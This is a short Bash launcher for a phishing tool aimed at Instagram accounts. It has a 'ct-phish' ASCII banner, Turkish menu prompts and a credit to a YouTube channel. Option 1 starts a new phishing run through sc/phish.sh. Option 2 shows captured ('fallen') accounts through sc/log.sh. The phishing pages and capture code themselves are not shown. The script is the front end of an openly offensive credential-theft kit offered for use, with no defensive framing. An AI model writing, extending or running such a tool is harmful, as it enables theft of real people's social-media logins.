echo '      _                _     _     _     '
echo '     | |              | |   (_)   | |    '
echo '  ___| |_ ______ _ __ | |__  _ ___| |__  '
echo ' / __| __|______|  _ \|  _ \| / __|  _ \ '
echo '| (__| |_       | |_) | | | | \__ \ | | |'
echo ' \___|\__|      | .__/|_| |_|_|___/_| |_|'
echo '                | |                      '
echo '                |_|                      '
echo -e "\033[31;40;1m
\033[31;40;1m[-]\e[37mİnstagram Phishing          \033[31;40;1m[-]\e[37mYouTube: CyberTech HD
"
echo "YENİ PHİSHİNG İÇİN: [1]"
echo "DÜŞEN HESAPLAR İÇİN:[2]"
read -p "İslem Numarası Giriniz: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
clear
cd sc
bash phish.sh
elif [[ $islem == 2 || $islem == 02 ]]; then
clear   
cd sc
bash log.sh
fi